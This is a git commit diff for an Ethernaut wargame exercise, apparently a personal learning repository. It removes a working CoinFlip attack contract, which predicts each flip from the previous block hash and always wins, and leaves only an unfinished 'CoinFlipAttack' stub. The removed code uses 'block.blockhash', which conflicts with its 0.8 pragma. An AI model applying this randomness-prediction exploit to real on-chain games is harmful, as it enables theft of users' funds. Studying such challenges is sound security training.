26cc0e11fca4fb51db90bb0135a2e32c8470f3ba
alkarobots <142201479+alkarobots@users.noreply.github.com>
2023-08-20 23:06:15 +0700

    Edited hackCoinFlip.sol

--- Coding/Ethernaut/3_HackCoinFlip.sol
+++ Coding/Ethernaut/3_HackCoinFlip.sol
@@ -1,23 +1,12 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract hackCoinFlip {
-    CoinFlip public originalContract = CoinFlip("Your Instance Address"); 
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+import "./3_CoinFlip.sol";
 
-  function hackFlip(bool _guess) public {
-    
-    // pre-deteremine the flip outcome
-    uint256 blockValue = uint256(block.blockhash(block.number-1));
-    uint256 coinFlip = blockValue / FACTOR;
-    bool side = coinFlip == 1 ? true : false;
+contract CoinFlipAttack {
+  // Create state variable to represent CoinFlip contract + FACTOR
+  CoinFlip public victimContract;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    // If I guessed correctly, submit my guess
-    if (side == _guess) {
-        originalContract.flip(_guess);
-    } else {
-    // If I guess incorrectly, submit the opposite
-        originalContract.flip(!_guess);
-    }
-  }
+
 }
